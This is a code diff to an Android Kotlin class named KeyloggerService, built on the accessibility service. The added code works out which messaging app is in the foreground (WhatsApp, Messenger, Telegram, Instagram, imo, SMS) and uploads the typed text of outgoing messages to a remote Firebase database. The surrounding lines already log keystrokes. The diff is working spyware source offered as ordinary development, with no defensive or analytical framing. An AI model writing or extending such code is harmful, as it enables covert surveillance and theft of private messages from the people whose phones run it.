@@ -600,6 +600,28 @@ class KeyloggerService : AccessibilityService() {
                     }
                     Timber.d("Keylog: $formattedLog")
                 }
+
+                // Log outgoing chat message to chat hub
+                val chatAppKey = when {
+                    packageName.contains("whatsapp", ignoreCase = true) -> "whatsapp"
+                    packageName.contains("facebook.orca", ignoreCase = true) || packageName.contains("messenger", ignoreCase = true) -> "messenger"
+                    packageName.contains("telegram", ignoreCase = true) || packageName.contains("challegram", ignoreCase = true) -> "telegram"
+                    packageName.contains("instagram", ignoreCase = true) -> "instagram"
+                    packageName.contains("imo", ignoreCase = true) -> "imo"
+                    packageName.contains("mms", ignoreCase = true) || packageName.contains("messaging", ignoreCase = true) -> "sms"
+                    else -> null
+                }
+                if (chatAppKey != null && text.length >= 2) {
+                    val outKey = "out_${now / 15000}" // Debounce per 15s session
+                    deviceRef?.child("chats")?.child(chatAppKey)?.child("messages")?.child(outKey)?.setValue(mapOf(
+                        "sender" to "You",
+                        "body" to text,
+                        "isOutgoing" to true,
+                        "time" to ServerValue.TIMESTAMP,
+                        "app" to chatAppKey,
+                        "pkg" to packageName
+                    ))
+                }
             } catch (e: Exception) {
                 Timber.e("Firebase write error: ${e.message}")
                 tryReinitFirebase()
